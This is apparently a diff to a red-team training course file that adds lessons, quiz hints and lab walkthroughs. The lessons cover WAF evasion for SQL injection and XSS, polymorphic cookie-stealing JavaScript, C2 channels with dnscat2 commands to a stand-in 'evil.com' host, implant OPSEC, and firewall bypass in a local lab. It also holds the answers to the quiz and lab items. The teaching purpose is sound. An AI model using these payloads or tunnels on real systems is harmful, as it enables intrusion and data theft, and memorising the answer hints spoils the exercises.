@@ -4,40 +4,69 @@
   "tasks": {
     "1": {
       "title": "WAF bypass",
+      "body": "## The 7 layers of evasion\n\n### 1. Encoding (the basics)\n\n```text\n' OR 1=1--                          ← the WAF sees this\n%27%20OR%201%3D1--                  ← URL encoded\n' UNION SELECT                       ← with normal spaces\n'%09UNION%09SELECT                   ← with tabs instead of spaces\n'/**/UNION/**/SELECT                 ← inline comments as separators\n```\n\n### 2. Hex encoding (MySQL)\n\n```sql\n-- Instead of: WHERE name='admin'\nWHERE name=0x61646d696e             -- hex for 'admin'\n```\n\n### 3. HTTP headers (what the WAF forgets)\n\n```bash\n# The WAF inspects ?id=... but who inspects X-Forwarded-For?\ncurl -H \"X-Forwarded-For: ' OR 1=1--\" http://victima.com/perfil\ncurl -H \"User-Agent: ' UNION SELECT 1,2,3--\" http://victima.com/\ncurl -H \"Referer: <script>alert(1)</script>\" http://victima.com/\n```\n\nIf the backend LOGS that header in SQL or reflects it in HTML → SQLi/XSS via headers.\n\n### 4. Case randomization + interleaved comments\n\n```sql\n-- The WAF looks for \"UNION SELECT\" (case-insensitive)\nSeLeCt                              ← case variation\nUN/**/ION SE/**/LECT                ← interleaved comment\nUnIoN/**/SeLeCt/**/1,2,3            ← both techniques combined\n```\n\n### 5. Chunked Transfer Encoding\n\nThe WAF needs to read the entire body to analyze it. `Transfer-Encoding: chunked`\nsplits the body into chunks that, individually, don't look like a payload.\n\n### 6. HTTP Parameter Pollution\n\n```text\n?id=1&id=' OR 1=1--\n```\n\nSome backends take the LAST value, some the first — the WAF may only see the\nfirst (clean) one while the backend processes the second (malicious) one.\n\n### 7. Unicode/homoglyphs\n\n```text\n' (normal quote) → ‛ ′ ＇  (different Unicode codepoints)\n```\n\nThe WAF looks for the ASCII quote; the backend normalizes Unicode → it gets through.",
       "questions": {
         "web-red-team-t01-q01": {
-          "prompt": "What technique encodes SQLi in hex?"
+          "prompt": "What technique encodes SQLi in hex?",
+          "hint": "0x... — MySQL interprets it directly."
         },
         "web-red-team-t01-q02": {
-          "prompt": "What HTTP feature can bypass parameter-only WAFs?"
+          "prompt": "What HTTP feature can bypass parameter-only WAFs?",
+          "hint": "Headers: X-Forwarded-For, User-Agent, Cookie, Referer...",
+          "options": {
+            "a": "Only the request body",
+            "b": "HTTP headers: X-Forwarded-For, User-Agent, Cookie — many WAFs don't inspect them",
+            "c": "Only GET parameters",
+            "d": "The favicon"
+          }
         },
         "web-red-team-t01-q03": {
-          "prompt": "What SQL comment alternative to -- is less detected?"
+          "prompt": "What SQL comment alternative to -- is less detected?",
+          "hint": "The '#'."
         }
       }
     },
     "2": {
       "title": "Polymorphic and C2",
+      "body": "## Polymorphic payloads: the chameleon\n\nA polymorphic payload changes its representation on EVERY execution without changing what\nit does. For JavaScript (XSS):\n\n```javascript\n// Original (detected by signatures):\ndocument.cookie\n\n// Polymorphic (equivalent, different shape):\n// Option 1: string concatenation\ndocument['cook'+'ie']\n\n// Option 2: eval with hex\neval(String.fromCharCode(100,111,99,117,109,101,110,116,46,99,111,111,107,105,101))\n\n// Option 3: self-referencing\nwindow[document.URL.split('/').pop().substring(0,8)]\n\n// Option 4: time-based (only runs after a delay, evades the WAF sandbox)\nsetTimeout(()=>document.cookie, 3000)\n```\n\nThe WAF looks for patterns (`document.cookie`, `alert(`) — polymorphism breaks them.\n\n## C2: disguised command & control\n\nC2 (Command and Control) is the channel through which the attacker controls the\ncompromised machine. In red teaming, it must look like LEGITIMATE traffic:\n\n| Technique | How it works | Detection |\n|---|---|---|\n| **HTTP beacons** | The shell \"calls home\" via GET/POST to a domain that looks normal | inspecting User-Agent, timing patterns |\n| **DNS tunneling** | Commands travel encoded in subdomains (`cmd.evil.com` → the DNS response contains data) | anomalies in DNS query volume |\n| **ICMP tunneling** | Data in the ping payload | ICMP payload > 32 bytes |\n| **Domain fronting** | Connecting to a legitimate CDN (cloudfront.net) with a different SNI | TLS inspection |\n\n```bash\n# DNS tunneling with dnscat2 (server):\ndnscat2-server evil.com\n# On the victim:\ndnscat2 --dns server=8.8.8.8,domain=evil.com\n```\n\n## Operational Security (OPSEC) for the red teamer\n\n1. **Jitter**: never beacon at exact intervals (300s ± 60s random)\n2. **Rotating User-Agent**: switch between Chrome/Firefox/curl depending on the environment\n3. **Domain aging**: register domains months before the engagement\n4. **Kill dates**: all implants with an automatic expiration date\n5. **Egress filtering awareness**: the SOC knows what goes out — mimic normal patterns",
       "questions": {
         "web-red-team-t02-q01": {
-          "prompt": "What is a polymorphic payload?"
+          "prompt": "Which best describes a polymorphic payload?",
+          "hint": "It changes shape on every run while keeping the same functionality.",
+          "options": {
+            "a": "A payload encrypted once that never changes again",
+            "b": "A payload that only runs if it detects there is no WAF",
+            "c": "A payload that changes shape on every run without changing its functionality",
+            "d": "A payload digitally signed to prevent tampering"
+          }
         },
         "web-red-team-t02-q02": {
-          "prompt": "What C2 protocol disguises as HTTP?"
+          "prompt": "What C2 protocol disguises as HTTP?",
+          "hint": "Cobalt Strike / Metasploit use HTTP/S as the transport."
         },
         "web-red-team-t02-q03": {
-          "prompt": "What tools create covert tunnels?"
+          "prompt": "What tools create covert tunnels?",
+          "hint": "dnscat2, iodine (DNS); icmpsh (ICMP).",
+          "options": {
+            "a": "Nmap",
+            "b": "dnscat2/iodine (DNS tunneling) and icmpsh (ICMP tunneling)",
+            "c": "Burp Suite",
+            "d": "sqlmap"
+          }
         }
       }
     },
     "3": {
       "title": "Lab: pierce the firewall",
+      "body": "## Port rules ≠ security\n\nThe lab spins up three services behind \"firewall rules\":\n\n```bash\ncd labs/firewall-bypass && cp flags.env.example flags.env\ndocker compose --env-file flags.env up -d\n# :18180 intranet (blocked) | :18443 gateway (allowed) | :18844 admin\n```\n\n### Evasion 1: tunnel through the trusted port\n\nThe rule says \"443 allowed\" — but a port doesn't know what it\ncarries. The lab's gateway forwards inward:\n\n```bash\ncurl -s \"http://127.0.0.1:18443/fetch?url=http://intranet.local/\"\n```\n\nIt's the same reason de facto C2 travels over 443 with legitimate-\nlooking mTLS: port-based policy is a fixed-height fence over\nuneven terrain. Domain fronting, SSH over HTTPS, DNS over\nHTTPS — they all live off this gap between \"allowed\" and \"benign\".\n\n### Evasion 2: source port 53\n\nThe admin rule allowlists `--sport 53` (DNS), assuming only the\ninternal resolver would talk that way. Any attacker CHOOSES their\nsource port:\n\n```python\n# from inside the lab network (docker exec):\nimport socket\ns = socket.socket()\ns.bind(('0.0.0.0', 53))          # my source port is 53\ns.connect(('127.0.0.1', 8443))   # the fw rule is satisfied\ns.sendall(b'GET / HTTP/1.0\\r\\n\\r\\n')\nprint(s.recv(4096))\n```\n\n(From outside the docker network, NAT rewrites the source port —\nthat's why the lab is attacked from inside, like a real pivot. On a\nflat enterprise network, `curl --local-port 53 http://target:8443/`\nworks directly.)\n\nIt's the kind of rule born from a 2011 ticket (\"monitoring needs to\nquery\") that survives three infrastructure teams. Correct rules\nfilter by identity (mTLS, tokens) and context, never by source port\nnumber.\n\n### The defender's diagnosis\n\n`nmap` from outside shows: 80 filtered, 443 open, 8443 filtered.\n\"Secure\", says the inventory. The 443 gateway and the sport-53\nrule tell another story — this room's discussion is how that was\naudited (internal pivoting + rule testing) before someone else did.",
       "questions": {
         "web-red-team-t03-q01": {
-          "prompt": "The intranet port 80 is blocked but 443 is open and relays. Extract the secret through the gateway. Submit the flag."
+          "prompt": "The intranet port 80 is blocked but 443 is open and relays. Extract the secret through the gateway. Submit the flag.",
+          "hint": "curl \"http://127.0.0.1:18443/fetch?url=http://intranet.local/\" — the firewall trusts the port, not the content"
         },
         "web-red-team-t03-q02": {
-          "prompt": "The admin service (:18844) only accepts connections whose SOURCE port is 53. Connect that way (from inside the lab network) and submit the flag."
+          "prompt": "The admin service (:18844) only accepts connections whose SOURCE port is 53. Connect that way (from inside the lab network) and submit the flag.",
+          "hint": "docker exec into the container + a python socket with bind(('', 53)) → the --sport 53 allow rule is one of the oldest firewall mistakes"
         }
       }
     }
